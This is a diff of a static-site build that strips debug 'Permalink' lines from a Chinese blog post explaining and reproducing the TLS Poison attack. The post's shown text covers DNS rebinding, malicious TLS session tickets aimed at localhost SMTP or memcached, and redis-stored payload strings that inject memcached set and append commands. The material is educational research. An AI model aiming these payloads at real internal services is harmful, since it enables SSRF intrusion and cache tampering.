 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/4_hu7280140089095783417.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/4_hu9853347108401446959.jpg 1024w"
@@ -2011,8 +2000,7 @@ data-flex-basis="426px"
 &lt;ol start="2">
 &lt;li>第二步， Client 会与攻击者指定的 35.x.x.x 这个攻击者的服务器进行 TLS 握手，并获得攻击者服务器返回给 Client 的特制的票据，在图中表示为 Payload ，然后完成 TLS 握手。&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: /Part1/5.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/5.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/5.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/5.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/5_hu17695057364798667023.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/5_hu4546571928357102748.jpg 1024w"
@@ -2024,8 +2012,7 @@ data-flex-basis="426px"
 &lt;ol start="3">
 &lt;li>第三部，当 Client 想与 Server 恢复会话时，需要再次查找 jmaddux.com 的 DNS 记录，由于攻击者之前给的 DNS 记录 TTL 时间非常非常短，让其在此时在自己的缓存中查不到原来的记录，这样会使得 Client 又去询问 jmaddux.com 的 DNS 记录，此时攻击者让其 DNS Server 返回 127.0.0.1 这个地址。&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: /Part1/6.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/6.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/6.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/6.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/6_hu7433685680589552454.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/6_hu6559897808557005488.jpg 1024w"
@@ -2037,8 +2024,7 @@ data-flex-basis="426px"
 &lt;ol start="4">
 &lt;li>最后，如果 Client 不校验本次获得的 ip 是否与上次一致，就会尝试与 127.0.0.1:25 进行 TLS Session Resumption ，也就是说， Client 会拿着攻击者特制的票据访问 127.0.0.1:25 ，尝试与之恢复 TLS 会话，这里就表现为 Client 发送含有 Payload 的 Client Hello 消息到 SMTP 服务器，至此完成一次 SSRF 攻击。&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: /Part1/7.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/7.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/7.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/7.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/7_hu11265153044658886948.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/7_hu12825954402755682415.jpg 1024w"
@@ -2048,7 +2034,7 @@ data-flex-grow="177"
 data-flex-basis="426px"
 >&lt;/p>
 &lt;p>整体的流程图如下图所示：&lt;/p>
-&lt;p>Permalink before if: https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg&lt;img src="https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg"
+&lt;p>&lt;img src="https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里再对图中进行一些解释：&lt;/p>
@@ -2155,8 +2141,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>PS: 注意这里需要加上&lt;code>-L&lt;/code>参数允许 curl 进行重定向。&lt;/p>
 &lt;p>接着如果第一次 DNS 就把我们的域名解析到 127.0.0.1的话，可以多试几次直到域名解析到你的 TLS VPS IP 上为止，然后等待 1 min 左右，如果网络顺畅，一切顺利的话，在 1min 左右就可以完成本次攻击。攻击效果如下图所示：&lt;/p>
-&lt;p>Permalink before if: /Part2/1.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/1.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/1.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/1.png"
 width="1846"
 height="1054"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/1_hu17653774785632521935.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/1_hu18262093960250375662.png 1024w"
@@ -2172,8 +2157,7 @@ data-flex-basis="420px"
 &lt;/ul>
 &lt;h3 id="the-details-of-original-method">The Details OF Original Method
 &lt;/h3>&lt;p>在整理这篇文章之前，我也参考了很多文章，虽然这些文章没有明确的说明这个攻击的攻击载体，也就是 Payload 最大长度是 32 字节，但是都给了让我产生了一种先入为主的概念，在我印象当中它就只局限于 32 字节，然后我去详细去看作者公开的 PDF 时，发现作者在演示攻击 SMTP 时有一个图是这样的：&lt;/p>
-&lt;p>Permalink before if: /Part2/2.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/2.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/2.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/2.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/2_hu14106273101847268955.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/2_hu16791479317910417150.jpg 1024w"
@@ -2196,8 +2180,7 @@ data-flex-basis="426px"
 &lt;p>所以作者原仓库实现的是基于 TLS 1.3 的 Session Resumption ，后面我们具体看其实现代码发现也确是如此，作者只实现了基于 PSK 的会话恢复 SSRF ，其他几类都没有实现。&lt;/p>
 &lt;p>所以，感觉一切都有些明朗了，那我们再来尝试一下超越 32 字节的 payload ，看看到底能不能实现。依旧按照如上的流程做好 setup ，只不过不同的是我们需要在 TLS VPS 的 redis 上修改一下 payload ，这次我们随意修改一下，只要够长就好，这里一定要注意把要发给 memcached 的 payload 当中的&lt;code>set&lt;/code>指令的第三个参数修改成其 value 的长度，比如说我们这里修改 payload 为：&lt;code>set payload &amp;quot;\r\nset foo 0 0 79\nThis time I'm really in your cache and I can write what I want into your cache.\r\n&amp;quot;&lt;/code>。（当然还是建议在实验之前使用之前的方法测试一下自己的 payload 能否写入到 memcached 当中）&lt;/p>
 &lt;p>Ok. Here we go.&lt;/p>
-&lt;p>Permalink before if: /Part2/3.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/3.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/3.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/3.png"
 width="2487"
 height="1413"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/3_hu7024281526087788462.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/3_hu2471570088809765844.png 1024w"
@@ -2355,7 +2338,7 @@ data-flex-basis="422px"
 &lt;p>AAAA 记录地址不通，会连接到 A 记录地址上。&lt;/p>
 &lt;p>A记录地址不通，会连接到 AAAA 记录地址上。&lt;/p>
 &lt;/blockquote>
-&lt;p>Permalink before if: https://www.zhaoj.in/wp-content/uploads/2020/10/1602817765b4f463b4513262746c16fe6f1b72278f-1024x377.png&lt;img src="https://www.zhaoj.in/wp-content/uploads/2020/10/1602817765b4f463b4513262746c16fe6f1b72278f-1024x377.png"
+&lt;p>&lt;img src="https://www.zhaoj.in/wp-content/uploads/2020/10/1602817765b4f463b4513262746c16fe6f1b72278f-1024x377.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是比较遗憾的是，如果对于一个域名进行这样的设置，AAAA 记录指向 TLS VPS 的 IPv6 地址上，A 记录指向 127.0.0.1 地址，实际测试 当中， curl 总是优先 127.0.0.1 ，并且没有随机的做法；如果对于一个域名进行这样的设置，AAAA 记录指向 ::1 地址上，A 记录指向 TLS VPS 的 IPv4 地址上，curl 总是优先 ::1&lt;/p>
@@ -2371,8 +2354,7 @@ loading="lazy"
 &lt;li>首先，默认配置下， 我们也可以通过 0.0.0.0:11211 这个地址与 memcached 通信&lt;/li>
 &lt;li>对于返回的双 A 记录，一个配置为 TLS VPS IP ，另一个为 0.0.0.0 ，curl 每次都会优先使用 TLS VPS IP ，如果不能通信才会接着使用 0.0.0.0:11211&lt;/li>
 &lt;/ul>
-&lt;p>Permalink before if: /Part2/4.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/4.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/4.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/4.png"
 width="889"
 height="437"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/4_hu15705131350741027187.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/4_hu8436676731418748917.png 1024w"
@@ -2404,8 +2386,7 @@ data-flex-basis="488px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>Ok. Let&amp;rsquo;s have a try.&lt;/p>
-&lt;p>Permalink before if: /Part2/5.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/5.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/5.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/5.png"
 width="2488"
 height="1326"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/5_hu16315222169391657398.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/5_hu2637806151994922989.png 1024w"
@@ -2433,8 +2414,7 @@ data-flex-basis="450px"
 &lt;/div>&lt;p>使用参数&lt;code>--tickets&lt;/code>，允许 TLS Server 使用 Session Tickets 进行 Session Resumption ；使用&lt;code>--protover 1.2&lt;/code>参数，只允许 TLS Server 最高使用 TLS 1.2 版本。并在 redis 设置 ticket_payload ，这个与之前设置的 payload 值一样，是用来对 memcached 进行利用的，我们这里就区别于之前随便设置一下就可以了，例如&lt;code>set ticket_payload &amp;quot;\r\nset foo 0 0 41\nThis is a TLS 1.2 session ticket example.\r\n&amp;quot;&lt;/code>&lt;/p>
 &lt;p>对于 Client ，我们不能再使用 curl ，因为其并没有实现 Ticket Session 插件&amp;hellip;所以我选用了老版本 Chrome 70.0.3538.77 for Ubuntu 进行学习。（提醒这里不要用 Firefox ，因为作者在 PDF 中表示过 Firefox 没有这个“特性”）&lt;/p>
 &lt;p>依旧在 TLS Server 上使用 proxy.py ，接着确定准备好就可以在本地打开 chrome 访问自己 TLS Server 的地址：&lt;/p>
-&lt;p>Permalink before if: /Part2/6.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/6.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/6.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/6.png"
 width="2489"
 height="1413"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/6_hu13117128777337730634.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/6_hu10754615782440778534.png 1024w"
@@ -2537,8 +2517,7 @@ data-flex-basis="422px"
 &lt;/div>
 &lt;/div>&lt;p>虽然可以 debug 找到问题所在，但是并不能完美地修正这个问题，只能做个临时的处理办法来解决这个问题，而且自己时间精力并不太足够，所以如果有同学有比较好的办法解决这个问题欢迎提 PR 修正这个问题！&lt;/p>
 &lt;p>然后在 redis 中修改 payload 为 32 字节长度：&lt;code>set payload &amp;quot;\r\nset foo 0 0 13\nI am so poor.\r\n&amp;quot;&lt;/code>。好了，那就让我们来试一下吧！&lt;/p>
-&lt;p>Permalink before if: /Part2/7.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/7.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/7.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/7.png"
 width="2489"
 height="1406"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/7_hu4952583913292015705.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/7_hu5754320242149570226.png 1024w"
@@ -2548,8 +2527,7 @@ data-flex-grow="177"
 data-flex-basis="424px"
 >&lt;/p>
 &lt;p>虽然我们只能使用 32 字节的 Session ID ，但是对于 memcahed ，我们可以使用&lt;code>append&lt;/code>命令进行追加，例如：&lt;code>set payload &amp;quot;\nappend foo 0 0 11\nSo so poor.\r\n&amp;quot;&lt;/code>。并且因为我们注释了那两行，所以对于重新设置了的 payload ，我们需要重新启动一次 TLS Server&lt;/p>
-&lt;p>Permalink before if: /Part2/8.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/8.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/8.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/8.png"
 width="2488"
 height="1413"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/8_hu10016470952081649732.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/8_hu15099609586433426047.png 1024w"
@@ -2561,8 +2539,7 @@ data-flex-basis="422px"
 &lt;p>好了，以上就是我们关于 TLS Poison 漏洞复现的部分。&lt;/p>
 &lt;h3 id="attack-impact">Attack Impact
 &lt;/h3>&lt;p>在作者的报告中指出如下的 Client 对 TLS 会话进行了缓存：&lt;/p>
-&lt;p>Permalink before if: /Part2/9.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/9.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/9.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/9.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/9_hu7730633353862580585.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/9_hu3857516943671648632.jpg 1024w"
@@ -2572,8 +2549,7 @@ data-flex-grow="177"
 data-flex-basis="426px"
 >&lt;/p>
 &lt;p>作者还给出了在内网中易受攻击的服务：&lt;/p>
-&lt;p>Permalink before if: /Part2/10.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/10.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/10.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/10.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/10_hu783114155709344290.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/10_hu4473832875989331703.jpg 1024w"
@@ -3325,8 +3301,7 @@ data-flex-basis="426px"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: /Part3/1.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/1.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/1.png"
+&lt;/div>&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/1.png"
 width="873"
 height="186"
